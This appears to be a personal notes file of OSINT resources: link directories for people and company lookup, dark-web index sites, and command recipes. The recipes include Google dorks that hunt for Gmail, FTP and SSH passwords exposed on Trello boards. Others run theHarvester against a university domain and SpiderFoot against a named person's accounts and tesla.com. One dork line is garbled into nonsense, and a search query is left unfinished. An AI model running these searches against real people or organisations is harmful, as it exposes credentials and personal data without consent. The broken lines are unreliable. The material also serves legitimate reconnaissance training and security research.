### linkedin
-   https://theorg.com/organizations

-   https://www.importyeti.com/company/apple

-   https://github.com/chm0dx/peepedIn

-   `site:(linkedin.com/in | zoominfo.com/p | rocketreach.co | xing.com/people | contacto




### all in one
-   [start.me](https://start.me/p/0P02pP/confrences)

-   https://start.me/p/PwmvMv/main

-   https://start.me/p/rx6Qj8/nixintel-s-osint-resource-list

-   https://start.me/p/1kJKR9

-   https://start.me/p/aLe0vp/osint-resources-in-canada

-   https://metaosint.github.io/table

-   https://start.me/p/1kBrw9/sans-osint-2022
-   https://map.malfrats.industries/

-   https://start.me/p/9E2mea/linux-tools

-   https://start.me/p/lLBdE6/ukraine-crisis-tracker

-   https://airtable.com/embed/shrYXDdO1V5y33lIX/tblgDtMXI4fxtg9Op

-   https://start.me/p/1kvvxN/

-   https://tor.taxi/

-   https://dark.fail/




## Evaluation of information on project management boards

```text
inurl:https://trello.com AND intext:@gmail.com AND intext:password
inurl:https://trello.com AND intext:ftp AND intext:password
inurl:https://trello.com AND intext:ssh AND intext:password
i   l ji   AND i titl l i AND i      l [            ]




python3 theHarvester.py -d sbmu.ac.ir -b all -l 200




python3 sf.py -l 127.0.0.1:8070
python3 sf.py -m sfp_spider,sfp_hunter,sfp_fullcontact,sfp_pgp,sfp_clearbit,sfp_emailform




python3 ./sf.py -m sfp_accounts -s "elonmusk" -q




python3 ./sf.py -m sfp_intfiles,sfp_spider,sfp_filemeta -s tesla.com -q -F RAW_FILE_META_
